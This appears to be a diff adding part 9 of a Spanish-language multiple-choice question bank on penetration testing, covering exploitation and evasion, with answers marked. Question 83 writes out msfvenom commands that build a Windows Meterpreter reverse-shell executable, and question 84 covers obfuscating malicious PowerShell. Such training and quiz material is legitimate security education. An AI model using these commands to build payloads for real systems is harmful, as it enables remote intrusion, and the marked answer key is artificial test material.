@@ -1,0 +1,63 @@
+# Banco de Preguntas - Parte 9 🎓
+
+### 📦 Bloque 9: Explotación y Evasión (81-90)
+
+81. **¿Qué herramienta se utiliza para interceptar y modificar peticiones HTTP/S entre el navegador y el servidor?**
+    - [ ] Wireshark.
+    - [X] Burp Suite.
+    - [ ] Nmap.
+    - [ ] Metasploit.
+
+82. **¿Qué ataque de Active Directory se basa en solicitar un ticket de autenticación (TGT) y crackearlo offline sin interactuar con el Domain Controller después de la solicitud inicial?**
+    - [ ] Kerberoasting.
+    - [X] AS-REP Roasting.
+    - [ ] Pass-the-Hash.
+    - [ ] Golden Ticket.
+
+83. **¿Cuál es el comando de `msfvenom` para generar un payload de Meterpreter reversa para Windows en formato ejecutable?**
+    - [ ] `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf -o out`
+    - [X] `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o payload.exe`
+    - [ ] `msfvenom -a x86 --platform windows -p reverse_tcp -f exe`
+    - [ ] `msfvenom -p windows/shell_reverse_tcp -f raw`
+
+84. **¿Qué técnica de evasión utiliza codificaciones como Base64 o Hex para ocultar comandos maliciosos en scripts de PowerShell?**
+    - [ ] Encryption.
+    - [X] Obfuscation (Ofuscación).
+    - [ ] Packing.
+    - [ ] Timestomping.
+
+85. **¿Qué es Shodan?**
+    - [ ] Una herramienta para crackear contraseñas de WiFi.
+    - [X] Un motor de búsqueda para dispositivos conectados a Internet (IoT, servidores, bases de datos).
+    - [ ] Un framework de explotación para sistemas Android.
+    - [ ] Un antivirus de próxima generación.
+
+86. **¿Qué vulnerabilidad de API ocurre cuando el servidor devuelve más información de la necesaria en la respuesta JSON, confiando en que el cliente la filtrará?**
+    - [ ] BOLA.
+    - [X] Excessive Data Exposure (Exposición Excesiva de Datos).
+    - [ ] Mass Assignment.
+    - [ ] Inyección de encabezados.
+
+87. **¿Qué protocolo industrial de Siemens utiliza el puerto 102?**
+    - [ ] Modbus TCP.
+    - [X] S7comm.
+    - [ ] EtherNet/IP.
+    - [ ] BACnet.
+
+88. **En Active Directory, ¿qué es un "Service Principal Name" (SPN)?**
+    - [ ] El nombre del administrador del dominio.
+    - [X] Un identificador único que vincula un servicio con una cuenta de usuario o equipo en AD.
+    - [ ] La dirección IP del Domain Controller.
+    - [ ] Un tipo de ticket de Kerberos cifrado con AES.
+
+89. **¿Qué herramienta de pentesting de Active Directory permite visualizar rutas de ataque complejas mediante teoría de grafos?**
+    - [ ] Rubeus.
+    - [X] BloodHound.
+    - [ ] PowerView.
+    - [ ] Mimikatz.
+
+90. **¿Cuál es la función del comando `sudo -l` en Linux?**
+    - [ ] Cambiar la contraseña del usuario actual.
+    - [X] Listar los privilegios permitidos para el usuario actual mediante el comando sudo.
+    - [ ] Eliminar todos los archivos temporales.
+    - [ ] Ver los puertos abiertos en el sistema.
